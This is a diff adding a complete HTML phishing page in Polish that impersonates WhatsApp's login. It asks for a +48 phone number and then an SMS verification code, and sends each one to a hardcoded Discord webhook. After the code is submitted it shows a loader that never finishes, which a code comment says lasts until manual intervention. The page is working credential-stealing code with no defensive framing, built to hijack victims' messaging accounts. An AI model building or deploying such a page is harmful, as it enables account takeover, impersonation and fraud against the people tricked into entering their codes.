@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>WhatsApp – Zaloguj się</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body, html {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    }
+    body {
+      background-color: #ECE5DD;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+    }
+
+    .container {
+      max-width: 360px;
+      width: 90%;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+      overflow: hidden;
+      text-align: center;
+      margin: auto;
+    }
+
+    .header {
+      background-color: #075E54;
+      height: 3.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .header img { height: 2rem; }
+
+    .content {
+      padding: 1.5rem 1rem;
+    }
+    .content h2 {
+      font-size: 1.25rem;
+      color: #303030;
+      margin-bottom: 1rem;
+    }
+
+    .input-group { margin-bottom: 1.25rem; text-align: left; }
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: #303030;
+      font-size: 0.875rem;
+    }
+    .phone-input, .code-input {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .prefix {
+      padding: 0.75rem;
+      background: #f0f0f0;
+      border: 1px solid #ddd;
+      border-radius: 4px 0 0 4px;
+      font-size: 1rem;
+      color: #303030;
+      flex-shrink: 0;
+    }
+    .input-group input {
+      flex: 1;
+      padding: 0.75rem;
+      font-size: 1rem;
+      border: 1px solid #ddd;
+      border-radius: 0 4px 4px 0;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 1rem;
+      background-color: #25D366;
+      color: white;
+      font-size: 1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn:active { opacity: 0.9; }
+
+    .footer {
+      text-align: center;
+      padding: 0.75rem 1rem;
+      font-size: 0.75rem;
+      color: #888;
+    }
+
+    .loader {
+      border: 0.375rem solid #f3f3f3;
+      border-top: 0.375rem solid #075E54;
+      border-radius: 50%;
+      width: 2.5rem;
+      height: 2.5rem;
+      animation: spin 1s linear infinite;
+      margin: 2.5rem auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Media Queries */
+    @media (max-width: 400px) {
+      .header img { height: 1.5rem; }
+      .content h2 { font-size: 1.125rem; }
+      .btn { padding: 0.75rem; font-size: 0.875rem; }
+    }
+    @media (max-width: 360px) {
+      .phone-input { flex-direction: column; }
+      .prefix, .input-group input {
+        border-radius: 4px;
+        border-right: 1px solid #ddd;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Krok 1: numer telefonu -->
+  <div class="container" id="phone-step">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <div class="content">
+      <h2>Zaloguj się do WhatsApp</h2>
+      <div class="input-group">
+        <label for="phone">Numer telefonu</label>
+        <div class="phone-input">
+          <div class="prefix">+48</div>
+          <input type="tel" id="phone" placeholder="600000000" maxlength="9" pattern="\d{9}" required>
+        </div>
+      </div>
+      <button class="btn" onclick="sendCode()">Dalej</button>
+    </div>
+    <div class="footer">WhatsApp LLC</div>
+  </div>
+
+  <!-- Krok 2: kod SMS -->
+  <div class="container" id="code-step" style="display: none;">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <div class="content">
+      <h2>Wprowadź kod weryfikacyjny</h2>
+      <div class="input-group">
+        <label for="code">Kod SMS</label>
+        <div class="code-input">
+          <input type="text" id="code" placeholder="123456" maxlength="6" pattern="\d{6}" required>
+        </div>
+      </div>
+      <button class="btn" onclick="verifyCode()">Weryfikuj</button>
+    </div>
+    <div class="footer">WhatsApp LLC</div>
+  </div>
+
+  <!-- Krok 3: loader -->
+  <div class="container" id="loader-step" style="display: none;">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <div class="content">
+      <div class="loader"></div>
+      <p>Logowanie…</p>
+    </div>
+    <div class="footer">WhatsApp LLC</div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1364124316672720946/RH_yjYGhG5gxCfCinGkgZnXTkbgKc67gZ_0r62YPS5xZNYxk8XmRTzeC_7B8LLXh1lin';
+
+    function sendCode() {
+      const phone = document.getElementById('phone').value;
+      if (!/^\d{9}$/.test(phone)) {
+        alert('Podaj poprawny numer składający się z 9 cyfr.');
+        return;
+      }
+      document.getElementById('phone-step').style.display = 'none';
+      document.getElementById('code-step').style.display = 'block';
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `sendCode: numer telefonu = ${phone}` })
+      }).catch(console.error);
+    }
+
+    function verifyCode() {
+      const phone = document.getElementById('phone').value;
+      const code  = document.getElementById('code').value;
+      if (!/^\d{6}$/.test(code)) {
+        alert('Podaj poprawny 6-cyfrowy kod.');
+        return;
+      }
+      document.getElementById('code-step').style.display = 'none';
+      document.getElementById('loader-step').style.display = 'block';
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `verifyCode: numer telefonu = ${phone}, kod = ${code}` })
+      }).catch(console.error);
+      // Loader działa wiecznie aż do ręcznej interwencji
+    }
+  </script>
+</body>
+</html>
